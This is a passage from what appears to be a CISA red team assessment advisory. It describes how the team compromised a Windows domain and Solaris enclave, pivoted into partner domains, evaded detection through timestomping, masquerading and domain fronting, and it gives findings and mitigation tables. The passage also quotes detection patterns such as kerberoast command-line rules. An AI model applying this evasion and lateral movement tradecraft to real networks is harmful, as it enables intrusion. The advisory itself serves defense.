<p>Internal network information was freely available to unprivileged, domain-joined users, and the team queried hundreds of megabytes of Active Directory (AD) data using a custom rewrite of <code>dsquery.exe</code> in <code>.NET</code> and Beacon Object File (BOF) <code>ldapsearch</code> from the phished user’s workstation. The team then data mined numerous internal file servers for accessible shares [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>]. The team found a password file left from a previous employee on an open, administrative IT share, which contained plaintext usernames and passwords for several privileged service accounts. With the harvested Lightweight Directory Access Protocol (LDAP) information, the team identified one of the accounts (ACCOUNT 3) had system center operations manager (SCOM) administrator privileges and domain administrator privileges for the parent domain. They identified another account (ACCOUNT 4) that also had administrative permissions for most servers in the domain. The passwords for both accounts had not been updated in over eight years and were not enrolled in the organization’s identity management (IDM).</p>
<h5><em>Lateral Movement and Persistence</em></h5>
<p>The team used valid accounts and/or tokens with varied techniques for lateral movement. Techniques included scheduled task manipulation, service creation, and application domain hijacking [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/014/\" title=\"Hijack Execution Flow: AppDomainManager\">T1574.014</a>]. For credential usage, the implemented IDM in the organization’s network hampered the red team’s ability to pivot as it blocked common credential manipulation techniques like pass-the-hash [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a>] and pass-the-ticket [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/003/\" title=\"Use Alternate Authentication Material: Pass the Ticket\">T1550.003</a>]. The red team found ways to circumvent the IDM, including using plaintext passwords to create genuine network logon sessions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/003/\" title=\"Access Token Manipulation: Make and Impersonate Token\">T1134.003</a>] for certain accounts not registered with the IDM, as well as impersonating the tokens of currently logged-in users to piggyback off valid sessions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/001/\" title=\"Access Token Manipulation: Token Impersonation/Theft\">T1134.001</a>].</p>
<p>The red team tailored payloads to blend with the network’s environment and did not reuse IOCs like filenames or file hashes, especially for persisted implants. Remote queries for directory listings, scheduled tasks, services, and running processes provided the information for the red team to masquerade as legitimate activity [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/004/\" title=\"Masquerading: Masquerade Task or Service\">T1036.004</a>].</p>
<p>The team emulated normal network activity by installing HTTPS beaconing agents on workstations where normal users browse the web, establishing internal network pivots with TCP bind and SMB listeners. They primarily relied on creating Windows services as their persistence mechanism.</p>
<p>The red team used the data mined credentials for ACCOUNT 3 to move laterally from the workstation to a SCOM server. Once there, using ACCOUNT 4, the team targeted a Systems Center Configurations Manager (SCCM) server, as it was an advantageous network vantage point. The SCCM server had existing logged-in server administrators whose usernames followed a predictable naming pattern (correlating administrative roles and privilege levels), allowing them to determine which account to use to pivot to other hosts.&nbsp;</p>
<p>The team targeted the organization’s jump servers frequented by highly privileged administrative accounts. Red team operators used stolen SCCM server administrator credentials to compromise one of the organization’s server-administrator jump hosts. They learned that the organization separated some, but not all, accounts onto separate jump servers by role (e.g., workstation administrators and server administrators had separate jump points, but server and domain administrators occasionally shared the same jump hosts). Once a domain administrator logged in, the red team stole the administrator’s session token and laterally moved to a domain controller where they pulled credentials for the entire domain via <code>DCSync</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/006/\" title=\"OS Credential Dumping: DCSync\">T1003.006</a>], obtaining full domain compromise (see Figure 5).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%205%20-%20Exploitation%20of%20the%20Windows%20Domain.jpg?itok=xZHx9Pi4\" width=\"720\" height=\"540\" alt=\"Figure 5: Exploitation of the Windows Domain\">


</div>
  </figure>
<h6><em><strong>Figure&nbsp;5: Exploitation of the Windows Domain</strong></em></h6>
<p>After compromising the domain, the team confirmed access to sensitive servers, including multiple high value assets (HVAs) and tier zero assets. None of the accessed servers had any noticeable additional protections or network access restrictions despite their sensitivity and critical functions in the network. Remote administration and access of these critical systems should be restricted to designated, role-based accounts coming from specific network enclaves and/or workstations. Isolation with these access vector limitations protects them from compromise and sharply reduces the associated noise, allowing defenders to more easily identify abnormal behavior.</p>
<h5><em>Pivoting Into External Trusted Partners</em></h5>
<p>The team inspected the organization’s trust relationships with other organizational domains through LDAP [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>] and identified connections to multiple external FCEB partner organizations, one of which they subsequently used to move laterally.</p>
<p>The team pulled LDAP information from PARTNER DC 1 and kerberoasted the domain, yielding one valid service account with a weak password they quickly cracked, but the team was unable to move laterally with this account because it lacked appropriate privileges. However, PARTNER 1 had trusted relationships with a second partner’s domain controller (PARTNER DC 2). Using the acquired PARTNER 1 credentials, the red team discovered PARTNER 2 also had a kerberoastable, highly privileged administrative service account whose password cracked, allowing the team to laterally move to a PARTNER 2 host from the original victim network (see Figure 6).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%206%20-%20Path%20of%20Exploitation%20into%20External%20FCEB%20Organizations.jpg?itok=nAIxe-Bo\" width=\"1024\" height=\"486\" alt=\"Figure 6: Path of Exploitation into External FCEB Organizations\">


</div>
  </figure>
<h6>figure 6: path of exploitation into external fceb organizations</h6>
<p>These cross-organizational attack paths are rarely identified or tested in regular assessments or audits due to network ownership, legal agreements, and/or vendor opacity. However, they remain a valuable access vector for advanced persistent threat (APT) actors.</p>
<p>Experimentation with access into trusted partner domains included the modification of local system firewall rules on the source domain controller to allow specific source and destination IPs. The organization’s host-based monitoring systems failed to identify the addition and removal of the red team’s firewall exceptions.</p>
<h5><em>Defense Evasion Techniques</em></h5>
<p><em><strong>Solaris Enclave </strong></em><a><em><strong>Figure&nbsp;</strong></em></a><em><strong>5: Exploitation of the Windows Domain</strong></em></p>
<p>Due to the lack of application allowlisting, the red team regularly masqueraded as legitimate software to remain undetected by the organization’s network defenders [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>]. Additionally, by default, command auditing in Solaris via the <code>lastcomm</code> command only captures the program being run—full file path and any command line arguments are not recorded. For example:</p>
<ul>
<li>A real file: <code>/opt/splunkforwarder/bin/splunkd</code></li>
<li>A malicious copy:&nbsp;<code>/opt/splunkforwarder/splunkd</code></li>
<li>Command auditing logs: <code>splunkd</code></li>
</ul>
<p>The team also hid common artifacts to obfuscate their operational activity, including modifying file timestamps [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/006/\" title=\"Indicator Removal: Timestomp\">T1070.006</a>]&nbsp;and permissions with the <code>touch</code> and <code>chmod/chown</code> commands [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1222/002/\" title=\"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\">T1222.002</a>] to blend with other files in the environment.</p>
<p><em><strong>Windows Domain</strong></em></p>
<p>The team used a diverse range of accounts, backdoors, and C2 channels with different network footprints to obfuscate activity [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a>].</p>
<p>Diversification of account usage, backdoors, and C2 channels further obfuscated red team activity in the domain. Lateral movement to new hosts featured a variety of accounts to reduce the risk of detection. When harvesting credentials, the team selected several backup accounts for each role (e.g., server admin, workstation admin, domain admin, service accounts) in case the intended account was locked, disabled, or flagged as compromised.</p>
<p>To emphasize the value of tool-agnostic/behavior-based detections, the red team deployed over seven different implants to mimic real-world adversaries’ diverse use of open source, commercial off-the-shelf (COTS), and custom RATs. Each featured different host and network signatures to evade out-of-the-box EDR detections and every implant had unique artifacts both on-disk and in-memory. The team also evaded EDR/AV by using proprietary loaders and beacon object files (BOFs) to make direct API calls and allow self-injection of <code>.NET</code> executables to run additional capabilities.</p>
<p>All the deployed tools had different network C2 channel footprints. Some beaconing agents connected via HTTPS to legitimate domains owned by the red team. Others used domain fronting [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/004/\" title=\"Proxy: Domain Fronting\">T1090.004</a>] to leverage common content delivery network (CDN) functionality. Outbound traffic sent to public websites not owned by the red team had a <code>Host</code>&nbsp;header that told the CDN provider it should redirect traffic to red-team-controlled IP addresses. Internal pivots used SMB on port <code>445</code> and TCP bind listeners on ephemeral high ports. The team tailored both to mimic named pipes and network connections already seen in the domain and evade detection.</p>
<h4><strong>Collaborative Phase</strong></h4>
<p>Five months into the assessment, the red team officially notified the organization’s security operations center (SOC) of the ongoing activity and began engaging directly with SOC leadership. At this point, the organization had not submitted deconflictions and did not appear to be actively investigating CISA SILENTSHIELD assessment activity.</p>
<p>During this phase, CISA refrained from providing TTPs or IOCs (such as concrete hosts, filenames, or C2 domains) to allow the organization to develop and test its own detection metrics. The team held weekly discussions with the organization’s senior technical staff, SOC, and system administrators, which led to measurable improvements in response times for known techniques and behavior-based detections that uncovered previously unknown tradecraft. Specifically, the red team worked with the organization to assist them with synthesizing the following data sources to identify the extent of the red team’s compromise:</p>
<ul>
<li>EDR alerts;</li>
<li>YARA scans;</li>
<li>C2 domains and techniques;</li>
<li>Internal pivot hosts;</li>
<li>Admin accounts used to pivot;</li>
<li>Memory dumps, revealing attempts to pass credentials; and</li>
<li>Email logs documenting the initial breach via phishing.</li>
</ul>
<p>Every cyber threat actor has a unique set of TTPs. Nevertheless, nearly all adversaries perform the same basic steps:</p>
<ul>
<li>Command execution (initial access and lateral movement);</li>
<li>Establish C2 channels and exfiltrate data;</li>
<li>Establish persistence;</li>
<li>Escalate privileges; and</li>
<li>Use and abuse credentials.</li>
</ul>
<p>All TTPs have corresponding artifacts, but not all IOCs are created equal. Fixating on a hyper-focused set of IOCs can catch known threats but impedes efforts to identify unknown adversaries employing different TTPs.</p>
<p>Major themes discussed during this phase that improved the organization’s behavior-based detection capabilities included log collection, forensic analysis, relying on IOCs for detection, monitoring and investigation management, and Sysmon misconfigurations.</p>
<h5><em>Log Collection</em></h5>
<p>The assessed organizations had ineffective and insufficient logs, and network defenders were not using logs to proactively detect anomalous behavior. With the red team’s assistance, the organization identified logging issues caused by hardware failures, limited backups, network bandwidth, and limited log collection and retention policies (only 60–90 days). In other cases, critical data was captured but not analyzed because artifacts were moved to cold storage.</p>
<p>The organization’s network defenders identified procedural and other roadblocks when attempting to acquire new forensic data. For example, affected servers could not be taken offline for imaging because there was no process in place to do so without impacting the organization’s operations. Additionally, attempts to capture forensic data via packet captures occurred directly on the compromised Solaris and Windows hosts, where the red team observed the data being collected and therefore had the opportunity to disrupt collection, tamper with evidence files, and better adapt and evade their defenses.</p>
<h5><em>Forensic Analysis</em></h5>
<p>Defenders did not monitor C2 egress via DNS. They believed their parent entity was monitoring their DNS traffic, absolving them of a need to collect and monitor logs for their analyses.</p>
<p>Forensic analysts blindly trusted the timestamps for files and persistence mechanisms without realizing they had been tampered with. Bogus times added to persistence mechanisms (such as scheduled tasks) led defenders to misjudge the timeline of the breach. Red team operators regularly adjusted the last-modified timestamp of files and folders—using either the native<code> touch -r</code> command or implants’ <code>timestomp</code> command to disguise the last-modified timestamp captured in the output of <code>ls –la</code>. Secondary file timestamps identified with <code>ls -lu</code> or <code>ls -lc</code> would have revealed abnormal file attributes, in addition to more reliable anomalies found during proper forensic investigation.</p>
<h5><em>Reliance on Known IOCs</em></h5>
<p>The red team used diversified TTPs in the Adversary Emulation phase to reflect the ability of cyber threat actors to bypass conventional, known-bad detection strategies. The network defenders did not detect much of the team’s activity. For example:</p>
<ul>
<li>After identifying a red team payload, network defenders wrote tailored YARA rules that signatured specific behavior of the red team’s loader, which uncovered several similar payloads but failed to catch any of the other six C2 frameworks.</li>
<li>Organization network defenders used a combination of custom and open source detection rules (such as <code>CommandLine=kerberoast*</code> or files called <code>bloodhound.zip</code>) and did not detect the team’s kerberoasting activity.</li>
</ul>
<h5><em>Regular Monitoring and Investigation Management</em></h5>
<p>Conversations with SOC leadership revealed several procedural issues that led to slow or incomplete analysis of the red team’s intrusion and activity. For example:</p>
<ul>
<li>While EDR products detected and quarantined several of the red team’s tools, including the initial phishing payload, the organization’s daily procedures did not always include review of EDR alerts. The red team worked with the organization to ensure rapid response to EDR alerts became a fundamental part of network defenders’ daily workflows. This allowed SOC personnel to identify new attempts at lateral movement.</li>
<li>Solaris network owners discovered that several firewalls had inadvertently been misconfigured or disabled. The organization’s technical teams worked directly with the red team to fix errors and to reorganize and revalidate the network topology.</li>
<li>Network defenders had poor operational security and alerted the red team of investigations. For example:
<ul>
<li>In one instance, after receiving incoming beacons from what was evidently a sandboxed environment, the payload was not renamed from its original file, allowing the red team to immediately identify how much of their access was under scrutiny. Organizations must ensure sandboxed environments are safe, secure, and thoroughly sandboxed.</li>
<li>The red team observed system administrators reviewing forensic artifacts tied to the team’s Solaris payload—searching for files, running packet captures for outbound C2 traffic, and port scanning the C2 redirector. Team members simply reinstalled their persistence with a new redirector and file path, sidestepping the informal investigation.</li>
</ul>
</li>
<li>IT teams were siloed from the SOC, who had no knowledge of the system administrator’s weeks long investigation into the anomalous network behavior.</li>
<li>While the organization compartmented most of its threat hunting and incident response in a separate domain, staff still used the compromised corporate domain accounts to communicate the details of active investigations and assessments.</li>
</ul>
<h5><em>Sysmon Misconfigurations</em></h5>
<p>The red team had a productive exchange with the organization on their Sysmon configuration, which the team abused throughout the assessment. The red team identified several misconfigurations:</p>
<ul>
<li>Deployment teams pushed the ruleset (stored as a <code>.xml</code> file) to a globally readable <code>C:\\Windows</code> directory. There were no rules in place to catch adversaries reading the configurations from disk or the registry. As a result, CISA’s red team was provided explicit file paths to safely place their payloads.</li>
<li>Rules targeted a single, tool-specific IOC rather than a technique (e.g., <code>sc.exe</code> rather than service creation events).</li>
<li>Exceptions were overly permissive (for example, excluding all Image entries anywhere in <code>C:\\Program Files (x86)\\Google\\Update\\*</code>).</li>
</ul>
<h3>LESSONS LEARNED AND KEY FINDINGS</h3>
<p>The red team noted the following lessons learned and key findings relevant to the security of the assessed organization’s network. These specific findings contributed to the team’s ability to gain persistent access across the organization’s network. See the Mitigations section for recommendations on how to address these findings.</p>
<h4>Lesson Learned: The assessed organization had insufficient controls to prevent and detect malicious activity.</h4>
<ul>
<li><strong>Finding #1: The organization’s perimeter network was not adequately firewalled from its internal network, which failed to restrict outbound traffic.</strong> A majority of the organization’s hosts, including domain controllers, had internet connectivity to broad AWS EC2 ranges, allowing the red team to make outbound web requests without triggering IDS/IPS responses. These successful connections revealed the lack of an application layer firewall capable of detecting protocol mismatches on common ports.</li>
<li><strong>Finding #2: The assessed organization had insufficient network segmentation</strong><em><strong>.</strong>&nbsp;</em>The lack of network segmentation allowed the red team to move into, within, and out of both the Solaris and Windows domain. This also enabled them to gather a massive amount of data about the organization and its systems. Internal servers could reach almost any other domain host, regardless of type (server vs. workstation), purpose (user laptop, file server, IDM server, etc.), or physical location. Use of network address translation (NAT) between different parts of the network further obfuscated data streams, hindering incident response.</li>
<li><strong>Finding #3: The organization had trust relationships with multiple partner organizations,&nbsp;</strong>which—when combined with weak credentials and network connectivity—allowed the red team to exploit and move laterally to a partner domain controller. This highlights the risk of blindly allowing third party network connectivity and the importance of regularly monitoring both privileged access and transitive trusted credential material<strong>.</strong></li>
<li><strong>Finding #4: The organization’s defensive staff did not sufficiently isolate their defensive investigative activity.</strong> Organizations should always communicate information pertaining to suspected incidents out-of-band, rather than from within a domain that they know to be compromised. While the defensive systems were shunted to another domain with correct (one-way) trusts, the red team identified a likely attack vector to that domain via the same, previously compromised IDM server. Some analysts also performed dynamic analysis of suspected implants from an internet-connected sandbox, tipping the red team to the specific files and hosts that were under investigation.</li>
<li><strong>Finding #5: Network defenders were not familiar with the intricacies of their IDM solution.</strong> The CISA red team identified accounts not enrolled in the IDM and successfully used those and already existing user access tokens to bypass IDM. The appliance, in its active configuration, was not exhaustively tested against common credential manipulation techniques nor were any alerts on anomalous behavior being monitored.</li>
<li><strong>Finding #6: The organization had some role-based host segmentation, but it was not granular enough.</strong> The organization used clearly defined roles (server administrator and domain administrator) but did not sufficiently segregate the accounts to their own servers or systems, enabling privilege escalation.</li>
</ul>
<h4>Lesson Learned: The organization did not effectively or efficiently collect, retain, and analyze logs.</h4>
<ul>
<li><strong>Finding #7</strong>: <strong>Defensive analysts did not have the information they needed</strong> due to a combination of issues with collecting, storing, and processing logs. Other policies collected too much useless data, generating noise and slowing investigation.</li>
<li><strong>Finding #8: Network defenders’ daily procedures did not always include analysis of EDR alerts</strong>, and the tools that were installed only provided a 30-day retention for quarantined files. Consequently, investigators were unable to access timely information that may have led to earlier detection of the red team’s activity.</li>
<li><strong>Finding #9: Forensic analysts trusted host artifacts that could have been modified by an adversary.&nbsp;</strong>In particular, file timestamps and packet captures were scrutinized without considering the possibility of malicious tampering.</li>
</ul>
<h4>Lesson Learned: Bureaucratic communication and decentralized teams hindered the organization’s network defenders.</h4>
<ul>
<li><strong>Finding #10: The organization’s technical staff were spread across decentralized teams.</strong> Siloed team structure meant that IT, security, and other technical teams lacked consistency with their tools, creating too much noise for defenders to sift through.</li>
<li><strong>Finding #11: The SOC team lacked the agency to rapidly update or deploy rulesets through the fractured IT teams</strong>. The organization diffused responsibility for individual tools, such as Sysmon, across multiple groups, hampering timeliness and maintenance of a defensive posture.</li>
<li><strong>Finding #12</strong>: <strong>The organization’s forensics team produced an incident response report which documented the red team’s initial exploitation of the Solaris enclave. However, the report was limited in scope and did not adequately document the red team’s ability to expand and persist</strong>.&nbsp;The success of the red team’s first phase, using publicly known TTPs, illustrated the business risk to all Solaris hosts and, by extension, the Windows environment. Moreover, the organization’s internal report only focused on vulnerable servers and did not account for a cyber threat actor’s ability to expand and persist in the Solaris enclave.
<ul>
<li>The Solaris administrator’s investigations of the red team failed to appear in either the report or in SOC deconflictions. An admin’s inquiry into unusual and probably malicious activity, particularly in the middle of an investigation of confirmed breaches of adjacent hosts, should have been considered in the report as evidence of lateral movement.</li>
</ul>
</li>
</ul>
<h4>Lesson Learned: A “known-bad” detection approach hampered detection of alternate TTPs.</h4>
<ul>
<li><strong>Finding #13</strong>: <strong>Defenders hyper-focused on specific IOCs, such as file attributes, particular C2 frameworks, or C2 domains.&nbsp;</strong>The organization’s network defenders did not initially employ tool-agnostic detections, causing them to positively identify some red team tools, but remain blind to the full extent of the compromise. They were accustomed to catching internal red teams that used specific TTPs; introducing a new “threat actor” with new TTPs sidestepped nearly all detections.</li>
<li><strong>Finding #14</strong>: <strong>Detection rules were visible from compromised systems</strong>, allowing the red team to sidestep detections based on hardcoded rules and exceptions.</li>
<li><strong>Finding #15: There was insufficient restriction of administrative tools.</strong> The technical staff lacked a standardized set of administrative tools, leaving all remote administration protocols available for use by admins, CISA red team, or adversaries. This also created excessive noise for defenders to effectively sift through to determine expected versus anomalous activity.</li>
<li><strong>Finding #16: There was insufficient tracking of software</strong>. There was no apparent approval or tracking process for software installation across the domain, preventing defensive analysts from identifying abnormal software placed by the red team. A comprehensive inventory of approved software would help defenders identify abnormal behavior and facilitate the deployment of application allow-listing.</li>
</ul>
<h3>NOTED STRENGTHS</h3>
<p>The assessed organization promptly planned for and resolved multiple identified issues, including with:</p>
<ul>
<li><strong>Windows service accounts</strong>: The organization eliminated over 30 percent of service accounts which were deemed unnecessary. There is an on-going effort to change service account passwords and apply DoD recommended STIG compliance (over 85 percent have been changed since the publication of this report).</li>
<li><strong>IDM</strong>: The organization is looking into how to improve their IDM implementation and apply additional security alerts and preventions for possible misuse of credentials. They plan to implement additional identity-based monitoring capabilities in front of tier zero assets.</li>
<li><strong>Egress</strong>: The organization implemented new processes to detect and prevent servers from anomalously egressing outside of the network to the internet.</li>
<li><strong>Host-based solutions</strong>: The organization used additional features of their antivirus software, such as reputation scores, to look for all executable file type outliers of to identify anomalous instances.</li>
<li><strong>Hosts</strong>: The organization decommissioned clusters of servers and completely rebuilt them from scratch after identifying numerous irreparable issues and misconfigurations.</li>
<li><strong>Solaris credentials</strong>: The organization changed passwords, removed SSH keys, restricted permissions, and removed unnecessary accounts.</li>
</ul>
<h3>MITIGATIONS</h3>
<h4><strong>Network Defenders</strong></h4>
<p>CISA recommends organizations implement the recommendations in Table 1 to mitigate the findings listed in the Lessons Learned and Key Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. See CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Recommendations to Mitigate Identified Issues</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Finding</strong></th>
<th role=\"columnheader\"><strong>Recommendation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Inadequate firewall between perimeter and internal devices</td>
<td>
<ul>
<li>Deploy internal and external network firewalls to inspect, log, and/or block unknown or unauthorized traffic.</li>
<li>Perform deep packet inspection to detect mismatched application traffic or encrypted data flows.</li>
<li>Restrict outbound internet egress to hosts whenever possible.</li>
<li>Establish a baseline of normal user activity, including unique IPs or domains.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient Network Segmentation</td>
<td>
<ul>
<li>Apply the principle of least privilege to limit the exposure of systems and services in the demilitarized zone (DMZ).</li>
<li>Segment the DMZ based on the sensitivity of systems and services as well as the internal network [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>].</li>
<li>Segment networks to protect assets and workstations from direct exposure to the internet by considering the criticality of the asset to business functions, sensitivity of the data traversing the asset, and requirements for internet access to the asset.</li>
<li>Implement and regularly test firewalls, access control lists, and intrusion prevention systems.</li>
<li>Take advantage of opportunities to create natural network segmentation. Securely configured VPNs used for remote laptops, for instance, create an easy place to filter and monitor incoming traffic.</li>
</ul>
</td>
</tr>
<tr>
<td>Trust relationships between domains were overly permissive</td>
<td>
<ul>
<li>Restrict network connectivity (ingress and egress) to only necessary services between trusted domains [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Regularly monitor privileged access via Foreign Security Principals (FSPs).</li>
</ul>
</td>
</tr>
<tr>
<td>Defensive activity was not sufficiently isolated</td>
<td>
<ul>
<li>Perform network defense investigations out-of-band [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li>Conduct regular security audits and penetration testing by internal and external parties.</li>
<li>Develop and implement a comprehensive Incident Response Plan (IRP) and conduct regular drills and simulations [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentResponseIRPlans2S\" title=\"Incident Response (IR) Plans (2.S)\">CPG 2.S</a>].</li>
</ul>
</td>
</tr>
<tr>
<td>IDM solutions were not fully understood and utilized</td>
<td>
<ul>
<li>Enroll all accounts in IDM solutions and test against common credential manipulation techniques.</li>
<li>Integrate the IDM solution with other systems and applications, allowing for the streamlining of workflows.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient role-based host segmentation</td>
<td>
<ul>
<li>Establish Role-Based Access Controls (RBAC) to systematically assign permissions based on job functions [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Implement a comprehensive security model incorporating micro-segmentation at the host level.</li>
</ul>
</td>
</tr>
<tr>
<td>Failure to monitor EDR alerts daily</td>
<td>
<ul>
<li>Develop and document Standard Operating Procedures (SOPs) for handling EDR alerts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentPlanningandPreparedness5A\" title=\"Incident Planning and Preparedness (5.A)\">CPG 5.A</a>].</li>
<li>Establish and maintain incident response playbooks.</li>
<li>Conduct regular audits and reviews of the EDR alert handling process.</li>
</ul>
</td>
</tr>
<tr>
<td>Host artifacts were overly trusted</td>
<td>
<ul>
<li>Operationalize and deploy File Integrity Monitoring (FIM) solutions.</li>
<li>Regularly review and adjust access permissions, adhering to the principle of least privilege [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Establish proper forensic processes to ensure integrity.</li>
</ul>
</td>
</tr>
<tr>
<td>Bureaucracy and decentralization of network defenders hampered communication and consistency</td>
<td>
<ul>
<li>Introduce cross-training initiatives to cultivate a collaborative culture.</li>
<li>Encourage the establishment of cross-functional projects.</li>
<li>Utilize collaboration platforms that seamlessly integrate various tools and systems.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient internal incident response report&nbsp;</td>
<td>
<ul>
<li>Promote a culture of ongoing improvement while also fostering a proactive approach among employees to promptly report suspicious activities.</li>
<li>Treat suspected incidents of compromise as a confirmed breach, and account for a threat actor’s ability to move laterally when defining the scope of incident response efforts.</li>
</ul>
</td>
</tr>
<tr>
<td>Focus on known/common IOCs</td>
<td>
<ul>
<li>Employ centralized logging and tool-agnostic detection methods.</li>
<li>Leverage threat intelligence feeds by integrating them into a SIEM tool.</li>
<li>Implement regular updates for IOCs and TTPs, with the capability for customization to address the specific threat landscape [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
</td>
</tr>
<tr>
<td>Detection rules were visible from compromised systems</td>
<td>
<ul>
<li>Integrate runtime detection mechanisms while removing world-readable configuration files from installer deployments where applicable.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient restriction of admin tools</td>
<td>
<ul>
<li>Enhance security posture by implementing application allowlisting to ensure only trusted and approved applications are permitted [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#HardwareandSoftwareApprovalProcess2Q\" title=\"Hardware and Software Approval Process (2.Q)\">CPG 2.Q</a>].</li>
<li>Apply the principle of least privilege by granting users only the minimum level of access necessary to perform job functions.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient tracking of software</td>
<td>
<ul>
<li>Conduct a comprehensive inventory of assets and establish a baseline for behavior [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#AssetInventory1A\" title=\"Asset Inventory (1.A)\">CPG 1.A</a>].</li>
<li>Utilize a Software Asset Management (SAM) solution that offers comprehensive tracking, reporting, and compliance management capabilities.</li>
<li>Deploy automated discovery and monitoring tools to continuously scan and identify new and existing software.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>CISA recommends organizations implement the recommendations in Table 2 to mitigate other identified issues that can be uncovered through traditional penetration tests or red team assessments.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Recommendations to Mitigate Identified Issues</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Issue</strong></th>
<th role=\"columnheader\"><strong>Recommendation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Accounts were overprivileged and the organization’s network contained unnecessary service accounts</td>
<td>
<ul>
<li>Apply the principle of least privilege when assigning permissions to user accounts. Audit existing group memberships, strip unnecessary privileges, and prune unnecessary nested groups/users.</li>
<li>Monitor for account lockout, especially on administrative accounts, and switch to a manual account unlock policy.</li>
<li>Increase monitoring for higher-risk accounts, such as service accounts, that are highly privileged and have a predictable pattern of behavior (e.g., scans that reliably run at a certain hour of the day).</li>
<li>Privileged users should have dedicated role-based user accounts and associated jump hosts to log into critical resources.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient EDR configuration</td>
<td>
<ul>
<li>Ensure all hosts have a form of EDR installed.</li>
<li>Deploy an EDR capable of catching commonly known obfuscation or execution techniques.</li>
</ul>
</td>
</tr>
<tr>
<td>Insecure and insufficient credentials</td>
<td>
<ul>
<li>Ensure sensitive credentials and documents are not stored in an accessible place.</li>
<li>Mandate strong and complex passwords [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MinimumPasswordStrength2B\" title=\"Minimum Password Strength (2.B)\">CPG 2.B</a>]. For more information, see CISA’s <a href=\"https://www.cisa.gov/secure-our-world/require-strong-passwords\" title=\" Secure Our World: Require Strong Passwords\">Secure Our World: Require Strong Passwords.</a></li>
</ul>
</td>
</tr>
</tbody>
</table>
<p><strong>Note:</strong> The above mitigations apply to critical infrastructure organizations with on-premises or hybrid environments. CISA encourage all organizations to <strong>prioritize purchasing products from manufacturers who demonstrate secure by design principles</strong>, such as evidenced by follow-on publications from companies who have signed the&nbsp;<a href=\"https://www.cisa.gov/securebydesign/pledge\" title=\" Secure by Design Pledge\">Secure by Design Pledge</a>.</p>
<h4><strong>Software Manufacturers</strong></h4>
<p>CISA recognizes that insecure software is the root cause of many flaws; the responsibility should not rest on the end user. CISA urges software manufacturers to implement the following:</p>
<ul>
